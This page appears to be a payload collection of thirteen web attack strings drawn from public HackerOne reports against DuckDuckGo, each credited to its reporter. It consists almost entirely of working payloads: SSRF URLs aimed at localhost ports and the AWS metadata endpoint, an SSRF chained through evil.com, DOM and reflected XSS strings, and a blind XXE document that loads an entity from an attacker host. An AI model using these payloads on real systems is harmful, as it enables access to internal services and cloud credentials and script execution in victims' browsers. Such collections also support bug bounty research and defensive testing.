# DuckDuckGo

13 payloads.

### `95f377ee`

```
https://target.com/iur/?f=1&image_host=https://127.0.0.1:18091/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `ab852dea`

```
http://127.0.0.1:9998/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `538f64c1`

```
http://127.0.0.1:8092/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `776ae7b5`

```
http://127.0.0.1:8091/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `494ae149`

```
http://127.0.0.1:18091/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `5bca9c73`

```
https://target.com/iur/?f=1&image_host=https://127.0.0.1:18091/ui/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `05bec16b`

```
https://127.0.0.1:18091/
```

**Parameter:** `image_host`
— [SSRF in target.com via the image_host parameter](https://hackerone.com/reports/358119) · DuckDuckGo · [fpatrik](https://hackerone.com/fpatrik)

### `9524055d`

```
https://target.com/iur/?f=1&image_host=http://169.254.169.254/latest/meta-data/
```

**Parameter:** `image_host`
— [SSRF vulnerability on target.com (access to metadata server on AWS)](https://hackerone.com/reports/395521) · DuckDuckGo · [cujanovic](https://hackerone.com/cujanovic)

### `2927c504`

```
https://target.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://evil.com/
```

**Parameter:** `u`
— [SSRF on target.com/iu/](https://hackerone.com/reports/398641) · DuckDuckGo · [d0nut](https://hackerone.com/d0nut)

### `3ac0903e`

```
https://target.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(document.domain
```

**Parameter:** `atb`
— [DOM XSS on 50x.html page](https://hackerone.com/reports/405191) · DuckDuckGo · [cujanovic](https://hackerone.com/cujanovic)

### `c16117b4`

```
https://target.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27
```

**Parameter:** `atb`
— [DOM XSS on 50x.html page on target.com](https://hackerone.com/reports/426275) · DuckDuckGo · [smither](https://hackerone.com/smither)

### `d85126ae`

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;
]>
<r></r>
```

— [Partial bypass of #483774 with Blind XXE on https://target.com](https://hackerone.com/reports/486732) · DuckDuckGo · [mik317](https://hackerone.com/mik317)

### `a11180c5`

```
urban dictionary "><img src=x<
```

**Parameter:** `q`
— [Reflected/Stored XSS on target.com](https://hackerone.com/reports/1110229) · DuckDuckGo · [monke](https://hackerone.com/monke)
